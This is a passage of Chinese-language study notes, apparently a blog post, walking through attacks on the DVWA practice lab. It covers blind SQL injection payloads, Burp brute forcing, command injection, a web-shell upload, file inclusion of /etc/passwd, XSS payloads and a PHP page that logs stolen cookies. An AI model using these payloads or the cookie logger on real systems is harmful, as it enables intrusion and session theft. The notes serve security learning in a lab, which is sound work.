class="string">-- 以下显示不存在		User ID is MISSING from the database.</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#</span><br><span class="line"><span class="comment">-- 此处判断存在字符型盲注</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 布尔盲注</span></span><br><span class="line"><span class="comment">-- 查数据库前要先判断数据库长度，发现x=4显示存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())=x#</span></span><br><span class="line"><span class="string">-- 二分法找数据库名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span>或小于字母ascii值#</span><br><span class="line"><span class="comment">-- d 100 v 118 w 119 a 97</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=100#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">118</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),3,1))=119#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span>#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- dvwa库中表的数量		x=2成立</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=x#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 表的长度		limit 0,1从第0行开始查一个</span></span><br><span class="line"><span class="string">--	guestbook</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr(&#x27;</span>guestbook<span class="string">&#x27;,1))=9#		--应该是有个强转str的步骤在里面</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(<span class="string">&#x27;guestbook&#x27;</span>)<span class="operator">=</span><span class="number">9</span>#</span><br><span class="line"><span class="comment">-- users</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>x#</span><br><span class="line"><span class="comment">-- g103 u117 e101 s115 t116 b98 o111 o111 k107</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=116#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">98</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),7,1))=111#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">8</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">111</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),9,1))=107#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- u 117 s 115 e 101 r 114 s 115</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1))=114#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- users表字段数量			x=8成立</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)=x#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 分别查找8个字段的长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span>x</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 二分法分别查找8个字段段的名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select user from dvwa.users limit 0,1)=&#x27;</span>admin</span><br><span class="line"><span class="comment">-- admin的a97</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97#</span></span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 此处应只用延迟判断</span></span><br><span class="line"><span class="comment">-- 有明显延迟			User ID is MISSING from the database.</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">-- 没有延迟				User ID exists in the database.</span></span><br><span class="line"><span class="string">1 and sleep(5)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定库名长</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=2,sleep(5),1) # 没有延迟</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">3</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=4,sleep(5),1) # 明显延迟</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表的数量</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if((<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() )<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表的长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</span></span><br><span class="line"><span class="string">后面差不多</span></span><br></pre></td></tr></table></figure>



<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数字型注入</span></span><br><span class="line">burpsuite抓包转repeater替换最后一行 去掉逗号抄low级别</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="operator">&amp;</span>Submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>

<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同low</span><br></pre></td></tr></table></figure>

<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE first_name like &#x27;%$id%&#x27;&quot;;</span><br><span class="line">#%表示任意字符 _表示任意单个字符</span><br><span class="line">#判断方法。输入%或_下划线能查询到所有数据，证明漏洞存在</span><br><span class="line">#like &#x27;%%%&#x27;				like &#x27;%_%&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="代码层面挖掘SQL注入漏洞"><a href="#代码层面挖掘SQL注入漏洞" class="headerlink" title="代码层面挖掘SQL注入漏洞"></a>代码层面挖掘SQL注入漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#代码中负责后去用户数据的变量:$_GET $_POST $_COOKIE $_SERVER</span><br><span class="line">#负责执行数据库查询操作的函数mysql_query()</span><br></pre></td></tr></table></figure>



<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_50339832/article/details/</span><br><span class="line">1.常用的账号密码比如top100 top500</span><br><span class="line">2.互联网被拖库后的账号密码比如当年的CSDN泄露的600w用户信息</span><br><span class="line">3.使用工具软件按照制定规则进行排列组合算法生成的字典，比如生日字典等</span><br><span class="line"></span><br><span class="line">send to intruder之后在position页面选择attack type</span><br><span class="line">sniper：狙击手，指定多个变量同时破解，但只设一个字典文件，将指定得到变量挨个用字典内容进行替换</span><br><span class="line">battering ram：攻城锤，指定多个变量，只设一个字典文件，将所有变量一起用字典内容替换，但需要分别设置字典文件，然后用对应的字典内容对变量进行替换</span><br><span class="line">cluster bomb：集束炸弹，指定多个变量，并未每个变量分别设置一个字典文件，然后用字典内容组合对变量进行替换</span><br><span class="line"></span><br><span class="line">payload type</span><br><span class="line">simple list：可以手动添加字典列表，也可以导入burpsuite自带的字典，或者导入自定义的字典</span><br><span class="line">runtime file：只能加载自定义的字典</span><br><span class="line">numbers：设定一个数值范围，从范围内一次或随机取值进行测试</span><br><span class="line">brute forcer：自己定义字符范围来生成字典文件</span><br></pre></td></tr></table></figure>

<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>qq_26406447<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">89882086</span></span><br></pre></td></tr></table></figure>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php_uname[<span class="string">&#x27;s&#x27;</span>]			<span class="comment">//获取操作系统信息</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;??&quot;</span>)		<span class="comment">//执行shell，php执行操作系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>个符号	| || &amp; &amp;&amp; ;</span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span> | net user		<span class="comment">//NET USER 用于创建和修改计算机上的用户帐户。当不带选项使用本命令时，它会列出计算机上的用户帐户。用户帐户的信息存储在用户帐户数据库中。　该命令仅在服务器上运行。</span></span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span> || net user		<span class="comment">//前面的命令执行不成功才会执行后面的命令</span></span><br><span class="line">    </span><br><span class="line">linux使用 ; 可以执行多条命令</span><br><span class="line">使用重定向&gt;在服务器生成文件，或者使用&lt;读取文件</span><br></pre></td></tr></table></figure>

<p>常见防范措施</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.对传入的命令严格过滤</span><br><span class="line">EscapeShellCmd()</span><br><span class="line">把字符串可能瞒过Shell而去执行另一个命令的字符转义，比如管道符|重定向&gt;文件读入&lt;</span><br><span class="line">EscapeShellArg()</span><br><span class="line">给定字符串加上单引号，并把字符串的单引号转义，这样字符串就可以安全地作为命令参数</span><br><span class="line">2.在后台对应用权限进行控制（比如给php建立独立得到账号，控制php启动权限）</span><br></pre></td></tr></table></figure>





<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传漏洞、SQL注入、XSS攻击是目前最主流得到Web攻击手法</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_44276741/article/details/115910426</span><br><span class="line">补充备注：</span><br><span class="line">Low		img有大小限制</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/06/dvwa/1653012847740.png" alt="1653012847740"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在前端限制value大小，可以随便修改</span><br><span class="line">http://192.168.213.135/dvwa/hackable/uploads/cmd.php</span><br><span class="line">执行cmd			注意有分号</span><br><span class="line">http://192.168.213.135/dvwa/hackable/uploads/cmd.php?cmd=system(%22dir%22);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/06/dvwa/文件上_post.png" alt="文件上_post"><img src="/2023/07/06/dvwa/文件上传_get.png" alt="文件上传_get"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//中国蚁剑只能用post连接</span></span><br><span class="line"><span class="comment">//get从url拿，post从body拿</span></span><br></pre></td></tr></table></figure>

<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">上传文件的MIME类型		大类/小类</span><br><span class="line">html网页.html			text/html</span><br><span class="line">普通文本.txt			text/plain</span><br><span class="line">GIF图像.gif			image/gif</span><br><span class="line">JPEG图像.jpeg.jpg		image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="comment">//由服务器端php源码可知，判断是用content-type这个属性，这个属性是根据上传文件得到，又应为没有在前端加以限制，有2种解法</span></span><br><span class="line"><span class="comment">//上传.php格式文件，抓包改content-type为image/png</span></span><br><span class="line"><span class="comment">//上传.png格式文件，抓包改后缀为.php</span></span><br></pre></td></tr></table></figure>

<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//程序开发人员通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用得到过程称为包含。</span></span><br><span class="line"><span class="comment">//有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞</span></span><br><span class="line"><span class="comment">//可能存在漏洞的页面URL</span></span><br><span class="line"><span class="comment">//	http：//xxx/index.php?page=downloads.php</span></span><br><span class="line"><span class="comment">//	http：//xxx/index.php?page=main.php</span></span><br><span class="line"><span class="comment">//漏洞测试</span></span><br><span class="line"><span class="comment">//	http://xxx/index.php?page=C:\Windows\system.ini</span></span><br><span class="line"><span class="comment">//	http://xxx/index.php?page=/etc/passwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//http://192.168.213.135/dvwa/phpinfo.php查询allow_url_include是否打开，需要打开</span></span><br><span class="line"><span class="comment">//这个在dvwa/php.ini里面有设置，不过和php.ini里现实的不一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/06/dvwa/1653633198694.png" alt="1653633198694"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://192.168.213.135/dvwa/vulnerabilities/fi/?page=/www/admin/localhost_80/wwwroot/dvwa/php.ini</span></span><br><span class="line"><span class="comment">// 	/etc/passwd也是绝对路径不知道为啥不行</span></span><br><span class="line"><span class="comment">//windows</span></span><br><span class="line"><span class="comment">//http://192.168.88.1/dvwa/vulnerabilities/fi/?page=D:\phpStudy\WWW\dvwa\php.ini</span></span><br><span class="line"><span class="comment">//参考资料</span></span><br><span class="line"><span class="comment">//http://t.zoukankan.com/yuzly-p-10799486.html</span></span><br><span class="line"><span class="comment">//https://blog.csdn.net/King0237/article/details/115055549</span></span><br></pre></td></tr></table></figure>

<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require(),找不到被包含的文件时产生致命错误，并停止脚本运行</span><br><span class="line">include(),找不到被包含文件时只会产生警告，脚本将继续运行</span><br><span class="line">include_once()与include()类似，唯一区别时如果该文件中代码已经被包含，则不会再次包含</span><br><span class="line">require_once()与require()类似，唯一区别时如果该文件中的代码已经被包含，则不会再次包含</span><br></pre></td></tr></table></figure>

<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">XSS危害</span><br><span class="line">    盗取用户cookie</span><br><span class="line">    修改网页内容</span><br><span class="line">    网站挂木马</span><br><span class="line">    利用网站重定向</span><br><span class="line">    XSS蠕虫</span><br><span class="line">XSS恶意代码大都使用javascript，要深入研究，需要精通Javascript</span><br><span class="line">用户用浏览器如果版本太新自带防XSS</span><br><span class="line"></span><br><span class="line"><span class="comment">//XSS又叫CSS(Cross Site Script)跨站脚本攻击，指往web页面插入恶意的HTML代码。用户浏览web时，html代码会被运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//向可输入框插入恶意的HTML代码或javascript代码</span></span><br><span class="line">    </span><br><span class="line">攻击语句</span><br><span class="line"><span class="comment">#页面跳转</span></span><br><span class="line">&lt;script&gt;location=<span class="string">&quot;http://www.baidu.com&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="comment">#嵌入网页</span></span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=400 height=300&gt;&lt;/iframe&gt;</span></span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=0 height=0 frameborder=0&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="非持久性–反射型XSS"><a href="#非持久性–反射型XSS" class="headerlink" title="非持久性–反射型XSS"></a>非持久性–反射型XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这种攻击方式无法将恶意代码保存到网站中，而支队当前url生效，因而它需要用户自行去触发，通常出现在网站搜索栏，用户登入口等地方</span><br><span class="line"><span class="comment">//通过GET和POST向服务器输入数据，输入数据一般放在URL或者form数据中，如果服务器对输入数据不过滤，验证和编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&lt;script&gt;alert(&quot;hyy&quot;)&lt;/script&gt;</span></span><br><span class="line"><span class="comment">//&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="持久性–存储型XSS"><a href="#持久性–存储型XSS" class="headerlink" title="持久性–存储型XSS"></a>持久性–存储型XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接将xss语句插入到网站的正常页面中（通常留言本），用户访问了这些页面，就会自动执行其中的xss语句，靶机：NPMserv中的火线BLOG网页</span><br><span class="line"><span class="comment">//服务器将用户输入的恶意脚本没有通过验证直接存放在数据库，且每次通过调用数据库的方式将数据呈现在浏览器上，该XSS脚本攻击将一直存在。若用户访问该页面，恶意脚本就会触发，用于盗取其他用户的私人信息</span></span><br></pre></td></tr></table></figure>

<h2 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//trim(?)函数用于去除字符串左右两侧的空格</span></span><br><span class="line"><span class="comment">//mysql_real_escape_string(?)转义，xss语句可能存在单引号等字符，但这些字符只是在被存入数据库时被进行了转义，当他们从数据库调出来在浏览器执行时，并不影响其原本功能</span></span><br><span class="line"><span class="comment">//htmlspecialshars(?)把预定义的字符转换为html实体，例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$str</span> = <span class="string">&quot;this is some &lt;b&gt;bold&lt;/b&gt; text&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//stripslashes(?)删除反斜杠</span></span><br><span class="line"><span class="comment">//addslashes()函数返回预定义字符之前添加反斜杠的字符串，预定义字符为单双引号，反斜杠\，NULL</span></span><br><span class="line"><span class="comment">//strip_tags()过滤字符串中的html标签</span></span><br></pre></td></tr></table></figure>

<h2 id="接受cookie的页面代码"><a href="#接受cookie的页面代码" class="headerlink" title="接受cookie的页面代码"></a>接受cookie的页面代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">准备一台安装又PHP环境的Web服务器(e.g.  <span class="number">192.168</span>.<span class="number">88.1</span>)创建一个名为getcookie.php的网页代码如下</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);			<span class="comment">//远程主机地址</span></span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);			<span class="comment">//格式显示时间</span></span><br><span class="line">    <span class="variable">$referer</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>);		<span class="comment">//链接来源</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);			<span class="comment">//打开cookie.txt,若不存在就创建它</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;	IP:&quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;	Date and Time: &quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;	Referer:&quot;</span>.<span class="variable">$referer</span>.<span class="string">&quot;	Cookie:&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;|||&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">如何测试：给这个网页发get请求</span><br><span 